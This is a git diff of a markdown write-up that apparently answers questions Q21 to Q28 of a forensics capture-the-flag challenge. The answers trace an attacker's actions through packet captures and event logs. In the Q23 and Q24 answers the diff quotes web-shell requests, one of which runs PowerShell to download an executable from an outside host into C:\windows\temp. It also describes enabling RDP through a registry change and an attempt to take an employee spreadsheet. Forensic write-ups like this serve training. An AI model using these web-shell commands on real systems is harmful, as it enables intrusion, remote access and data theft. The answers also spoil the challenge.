@@ -521,45 +521,79 @@ SSH-*.*-*.** *******:******** *** ****** (*******) *.**
 ![victim123](https://github.com/user-attachments/assets/cd7ae08d-8dbf-49d2-bf6d-b0ece30987cd)
 
 ##### - Answer: `Victim:victim123`
+
 <br>
 
 #### Q21: After a while the attacker started to search for a confidential data. can you tell what was the first directory he looked at?
 ```
-C:\Users\Victim\Pictures
 *:\*****\******\********
-
 ```
+- Open `2.pcap` file now
+- filter: `http and ip.addr ==192.168.20.134`
+![image](https://github.com/user-attachments/assets/8f49ab54-9736-4867-b46d-eb9d56ec127c)
+
+
+
+#### - Answer: - `C:\Users\Victim\Pictures`
 
 #### Q22: What Did he try to steal? (filename)
 ```
-Employees.xls
-*********.***
+*********.****
 ```
+- What Did he Download?
+![image](https://github.com/user-attachments/assets/4779af86-0cbd-4b6d-b4ae-895c83ca3a12)
+- It failed because of an error in filename he wrote in the download feild `dir C:\Users\Victim\Desktop\Employees.xlsx`
+
+##### - Answer: `Employees.xlsx`
+
+<br>
 
 #### Q23: The fun is not over yet. he decided to download another file to the victim machine. what is the name of that file at the server?
 ```
-file.exe
 ****.***
 ```
+- `GET /custom/login/wbsh.jsp?cmd=(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')&action=exec HTTP/1.1 `
+- Downloaded `file.exe` and wrote it to `C:\windows\temp\ekern.exe`
+![image](https://github.com/user-attachments/assets/8a8eb7b7-fbea-4a00-bb9d-99e878e8ff41)
+
+##### - Answer: `file.exe`
+
+<br>
+
 #### Q24: Then he checked for a service status. What was it?
 ```
-TermService
 ***********
 ```
+- `GET /custom/login/wbsh.jsp?cmd=Get-Service -Name TermService&action=exec HTTP/1.1`
+
+##### - Answer: `TermService` 
+
+<br>
 
 #### Q27: After That he was hungry for more evil. He needed to ensure that they can remotely access the system. How can he access the system Remotely, what protocol does he need?
 ```
-RDP
 ***
 ```
+##### - Answer: `RDP`
+
+<br>
+
 
 #### Q27: What Registery Value Did he change? (path included)
 ```
-HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections
 ****\******\*****************\*******\******** ******\******************
 ```
 > [!TIP]
 > evtx
+- There is an base64 encoded command let's decode it
+
+![image](https://github.com/user-attachments/assets/8800d647-cd2a-4879-954f-144f2ce0c3be)
+
+![image](https://github.com/user-attachments/assets/879ed362-315b-461e-aec6-49bb4033dbe9)
+
+- Looks Like the Attacker is Enabling RDP.
+
+##### - Answer: `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections`
 
 #### Q28: There is a .bat file was created. Where is it? (Absolute Path including the filename)
 ```
